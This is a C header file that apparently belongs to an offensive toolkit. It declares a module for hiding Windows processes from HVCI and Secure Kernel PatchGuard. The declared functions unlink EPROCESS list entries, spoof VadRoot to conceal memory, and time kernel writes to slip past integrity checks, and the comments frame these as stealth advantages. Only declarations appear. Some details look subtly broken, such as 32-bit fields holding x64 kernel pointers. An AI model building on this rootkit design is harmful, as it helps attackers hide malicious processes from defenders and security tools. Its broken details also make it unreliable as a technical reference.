#ifndef JOCKY_PATCHGUARD_PEEKABOO_H
#define JOCKY_PATCHGUARD_PEEKABOO_H

#include <stdint.h>
#include <windows.h>

/* PatchGuard Peekaboo: HVCI/Secure Kernel Process Hiding
 *
 * Hides processes under Hyper-V Code Integrity (HVCI) and Secure Kernel
 * PatchGuard (SKPG) by manipulating kernel process linked lists while
 * avoiding KERNEL_SECURITY_CHECK_FAILURE bugchecks.
 *
 * SKPG runs in VTL1 (Virtual Trust Level 1 / privileged hypervisor context)
 * and monitors VTL0 (normal kernel) via watchdog, making direct patching
 * of kernel code impossible. This technique manipulates process structures
 * instead with randomized, delayed writes.
 *
 * Technique: Outflank, January 2026
 * Platform: Windows x64 (Windows 11 with HVCI/SKPG)
 * Effort: 4 days
 *
 * Advantages:
 * - Works under HVCI protection (unlike traditional PG bypasses)
 * - No inline hooks or kernel code modification needed
 * - Avoids direct PatchGuard integrity checks
 * - Process remains in VAD tree (memory access works)
 * - Only hidden from kernel enumeration (PspCidTable)
 */

/* HVCI/Secure Kernel detection and capabilities */
typedef struct {
    uint32_t hvci_enabled;      /* HVCI active (requires UEFI/firmware) */
    uint32_t skpg_enabled;      /* Secure Kernel PatchGuard running */
    uint32_t vtl_level;         /* Current VTL (0 = kernel, 1 = hypervisor) */
    uint64_t smep_enabled;      /* SMEP enforcement */
    uint64_t smap_enabled;      /* SMAP enforcement */
} HVCI_CAPABILITIES;

/* Hidden process context for tracking */
typedef struct {
    uint32_t pid;
    char process_name[256];
    void* eprocess_addr;        /* Kernel EPROCESS structure address */
    uint32_t original_links[2]; /* Saved process link pointers */
} HIDDEN_PROCESS_INFO;

/* Detect if HVCI/Secure Kernel is active on this system */
int jocky_patchguard_detect_hvci(HVCI_CAPABILITIES* out_caps);

/* Check if current system has HVCI enabled */
int jocky_patchguard_hvci_enabled(void);

/* Check if Secure Kernel PatchGuard is running */
int jocky_patchguard_skpg_enabled(void);

/* Hide a process by unlinking from PspCidTable and ActiveProcessLinks */
int jocky_patchguard_hide_process(
    uint32_t pid,
    HIDDEN_PROCESS_INFO* out_info);

/* Unhide a previously hidden process */
int jocky_patchguard_unhide_process(
    const HIDDEN_PROCESS_INFO* info);

/* Find EPROCESS structure for a given PID */
int jocky_patchguard_find_eprocess(
    uint32_t pid,
    void** out_eprocess);

/* Manipulate process linked list with delayed randomized writes */
int jocky_patchguard_unlink_process(
    void* eprocess,
    uint32_t* out_prev_link,
    uint32_t* out_next_link);

/* Re-link process by restoring saved pointers */
int jocky_patchguard_relink_process(
    void* eprocess,
    uint32_t prev_link,
    uint32_t next_link);

/* Query hidden process list */
int jocky_patchguard_enum_hidden_processes(
    HIDDEN_PROCESS_INFO* out_processes,
    int max_count,
    int* out_count);

/* Count of currently hidden processes */
uint32_t jocky_patchguard_hidden_count(void);

/* Check if a process is currently hidden */
int jocky_patchguard_is_hidden(uint32_t pid);

/* Spoof EPROCESS.VadRoot to hide memory mappings */
int jocky_patchguard_spoof_vad_root(
    void* eprocess,
    void** out_saved_vad_root);

/* Restore original VadRoot pointer */
int jocky_patchguard_restore_vad_root(
    void* eprocess,
    void* saved_vad_root);

/* Query HVCI-safe kernel memory window (timing attack mitigation) */
int jocky_patchguard_get_safe_window(uint32_t* out_window_ms);

/* Wait for optimal timing to modify kernel structures */
int jocky_patchguard_wait_for_safe_window(void);

/* Detect SKPG integrity check frequency for timing */
int jocky_patchguard_detect_skpg_frequency(uint32_t* out_frequency_ms);

#endif /* JOCKY_PATCHGUARD_PEEKABOO_H */
